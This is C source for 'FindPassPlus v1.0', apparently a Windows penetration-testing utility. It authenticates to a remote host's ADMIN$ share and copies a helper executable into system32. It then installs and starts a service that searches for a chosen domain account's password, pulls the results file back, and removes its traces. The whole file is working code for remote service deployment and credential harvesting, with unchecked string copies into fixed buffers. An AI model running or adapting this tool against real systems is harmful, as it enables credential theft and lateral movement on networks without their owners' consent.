//
// gcc FindPassPlus.c -o FindPassPlus.exe -lmpr -ladvapi32
//

#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <winnetwk.h>

VOID        Usage( VOID );
BOOL      Connect( CHAR *szTarget, CHAR *szUsername, CHAR *szPassword );
VOID FindPassPlus( CHAR *szTarget, CHAR *szSearchDomainName, CHAR *szSearchUsername );
VOID   Disconnect( CHAR *szTarget );

INT main( INT argc, CHAR *argv[] )
{
	CHAR              szTarget[ 128 ];
	CHAR  szFullSearchUsername[ 128 ];
	CHAR            szUsername[ 128 ];
	CHAR            szPassword[ 128 ];
	CHAR            *pLocation;
	DWORD           dwLocation;
	DWORD                    i;
	CHAR    szSearchDomainName[ 128 ];
	DWORD                    j;
	CHAR      szSearchUsername[ 128 ];
	CHAR        szFullUsername[ 128 ];

	if ( argc == 5 )
	{
		strcpy( szTarget,             argv[1] );
		strcpy( szFullSearchUsername, argv[2] );
		strcpy( szUsername,           argv[3] );
		strcpy( szPassword,           argv[4] );

		pLocation = strstr( szFullSearchUsername, "\\" );

		if ( pLocation != NULL )
		{
			dwLocation = (INT)( pLocation - szFullSearchUsername + 1 );

			i = 0;

			while ( i < dwLocation - 1 )
			{
				szSearchDomainName[i] = szFullSearchUsername[i];

				i++;
			}

			szSearchDomainName[i] = '\0';

			strupr( szSearchDomainName );

			i = strlen( szSearchDomainName ) + 1;

			j = 0;

			while ( i < strlen( szFullSearchUsername ) )
			{
				szSearchUsername[j] = szFullSearchUsername[i];

				i++;
				j++;
			}

			szSearchUsername[j] = '\0';

			printf( "Running FindPassPlus v1.0 with the following arguments:\n" );
			printf( "[+] Target Host:     \"%s\"\n", szTarget );
			printf( "[+] Search Username: \"%s\\%s\"\n", szSearchDomainName, szSearchUsername );
			printf( "[+] Username:        \"%s\"\n", szUsername );
			printf( "[+] Password:        \"%s\"\n", szPassword );
			printf( "\n" );

			if ( strstr( szUsername, "\\" ) == NULL && strcmp( szUsername, "+" ) != 0 && strcmp( szUsername, "" ) != 0 )
			{
				sprintf( szFullUsername, "%s\\%s", szTarget, szUsername );

				if ( Connect( szTarget, szFullUsername, szPassword ) )
				{
					FindPassPlus( szTarget, szSearchDomainName, szSearchUsername );

					Disconnect( szTarget );
				}
			}
			else
			{
				if ( strcmp( szUsername, "+" ) == 0 && strcmp( szPassword, "+" ) == 0 )
				{
					FindPassPlus( szTarget, szSearchDomainName, szSearchUsername );
				}
				else
				{
					if ( Connect( szTarget, szUsername, szPassword ) )
					{
						FindPassPlus( szTarget, szSearchDomainName, szSearchUsername );

						Disconnect( szTarget );
					}
				}
			}
		}
		else
		{
			Usage();
		}
	}
	else
	{
		Usage();
	}

	return 0;
}

VOID Usage( VOID )
{
	printf( "FindPassPlus v1.0 | http://reedarvin.thearvins.com/\n" );
	printf( "\n" );
	printf( "Usage: FindPassPlus <hostname | ip address> <domain\\search username> <username> <password>\n" );
	printf( "\n" );
	printf( "<hostname | ip address>   -- required argument\n" );
	printf( "<domain\\search username>  -- required argument\n" );
	printf( "<username>                -- required argument\n" );
	printf( "<password>                -- required argument\n" );
	printf( "\n" );
	printf( "If the <username> and <password> arguments are both plus signs (+), the\n" );
	printf( "existing credentials of the user running this utility will be used.\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "FindPassPlus 10.10.10.10 domain\\myaccount + +\n" );
	printf( "FindPassPlus 10.10.10.10 domain\\myaccount administrator password\n" );
	printf( "\n" );
	printf( "FindPassPlus MyWindowsMachine domain\\myaccount + +\n" );
	printf( "FindPassPlus MyWindowsMachine domain\\myaccount administrator password\n" );
	printf( "\n" );
	printf( "(Written by Reed Arvin | reedarvin@gmail.com)\n" );
}

BOOL Connect( CHAR szTarget[], CHAR szUsername[], CHAR szPassword[] )
{
	CHAR        szRemoteName[ 128 ];
	NETRESOURCE           nr;
	DWORD           dwResult;

	sprintf( szRemoteName, "\\\\%s\\ADMIN$", szTarget );

	nr.dwType       = RESOURCETYPE_ANY;
	nr.lpLocalName  = NULL;
	nr.lpRemoteName = szRemoteName;
	nr.lpProvider   = NULL;

	dwResult = WNetAddConnection2( &nr, szPassword, szUsername, 0 );

	if ( dwResult == NO_ERROR )
	{
		return TRUE;
	}
	else
	{
		fprintf( stderr, "ERROR! Cannot connect to \\\\%s\\ADMIN$.\n", szTarget );

		return FALSE;
	}
}

VOID FindPassPlus( CHAR szTarget[], CHAR szSearchDomainName[], CHAR szSearchUsername[] )
{
	CHAR                   szRemoteEXEPath[ 256 ];
	SC_HANDLE                 schSCManager;
	SC_HANDLE                   schService;
	CHAR                            *pArgs[ 2 ];
	SERVICE_STATUS_PROCESS        ssStatus;
	DWORD                    dwBytesNeeded;
	CHAR                     szSrcFileName[ 128 ];
	CHAR                     szDstFileName[ 128 ];

	sprintf( szRemoteEXEPath, "\\\\%s\\ADMIN$\\system32\\FindPassPlusSvc.exe", szTarget );

	if ( CopyFile( "FindPassPlusSvc.exe", szRemoteEXEPath, FALSE ) )
	{
		schSCManager = OpenSCManager( szTarget, NULL, SC_MANAGER_ALL_ACCESS );

		if ( schSCManager != NULL )
		{
			schService = CreateService( schSCManager, "FindPassPlusSvc", "FindPassPlus Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, "%windir%\\system32\\FindPassPlusSvc.exe", NULL, NULL, NULL, NULL, NULL );

			if ( schService != NULL )
			{
				pArgs[0] = szSearchDomainName;
				pArgs[1] = szSearchUsername;

				if ( StartService( schService, 2, (LPCSTR *)pArgs ) )
				{
					printf( "Waiting for FindPassPlus service to terminate on host %s", szTarget );

					while ( TRUE )
					{
						if ( QueryServiceStatusEx( schService, SC_STATUS_PROCESS_INFO, (BYTE *)&ssStatus, sizeof( SERVICE_STATUS_PROCESS ), &dwBytesNeeded ) )
						{
							if ( ssStatus.dwCurrentState == SERVICE_STOPPED )
							{
								break;
							}
							else
							{
								printf( "." );
							}
						}
						else
						{
							fprintf( stderr, "ERROR! Cannot query FindPassPlus service status on host %s.\n", szTarget );

							break;
						}

						Sleep( 1000 );
					}

					printf( "\n" );
					printf( "\n" );

					sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\FoundPasswords.txt", szTarget );
					sprintf( szDstFileName, "%s-FoundPasswords.txt", szTarget );

					if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
					{
						printf( "Retrieved file %s-FoundPasswords.txt\n", szTarget );

						if ( !DeleteFile( szSrcFileName ) )
						{
							fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\ProcessList.txt.\n", szTarget );
						}
					}

					sprintf( szSrcFileName, "\\\\%s\\ADMIN$\\system32\\ErrorLog.txt", szTarget );
					sprintf( szDstFileName, "%s-ErrorLog.txt", szTarget );

					if ( CopyFile( szSrcFileName, szDstFileName, FALSE ) )
					{
						printf( "Retrieved file %s-ErrorLog.txt\n", szTarget );

						if ( !DeleteFile( szSrcFileName ) )
						{
							fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\ErrorLog.txt.\n", szTarget );
						}
					}
				}
				else
				{
					fprintf( stderr, "ERROR! Cannot start FindPassPlus service on host %s.\n", szTarget );
				}

				if ( !DeleteService( schService ) != 0 )
				{
					fprintf( stderr, "ERROR! Cannot remove FindPassPlus service from host %s.\n", szTarget );
				}

				CloseServiceHandle( schService );
			}
			else
			{
				fprintf( stderr, "ERROR! Cannot create FindPassPlus service on host %s.\n", szTarget );
			}

			CloseServiceHandle( schSCManager );
		}
		else
		{
			fprintf( stderr, "ERROR! Cannot open service manager on host %s.\n", szTarget );
		}

		if ( !DeleteFile( szRemoteEXEPath ) )
		{
			fprintf( stderr, "ERROR! Cannot delete file \\\\%s\\ADMIN$\\system32\\FindPassPlusSvc.exe.\n", szTarget );
		}
	}
	else
	{
		fprintf( stderr, "ERROR! Cannot copy file FindPassPlusSvc.exe to \\\\%s\\ADMIN$\\system32\\.\n", szTarget );
	}
}

VOID Disconnect( CHAR szTarget[] )
{
	CHAR  szRemoteName[ 128 ];
	DWORD     dwResult;

	sprintf( szRemoteName, "\\\\%s\\ADMIN$", szTarget );

	dwResult = WNetCancelConnection2( szRemoteName, 0, TRUE );

	if ( dwResult != NO_ERROR )
	{
		fprintf( stderr, "ERROR! Cannot disconnect from \\\\%s\\ADMIN$.\n", szTarget );
	}
}

// Written by Reed Arvin | reedarvin@gmail.com
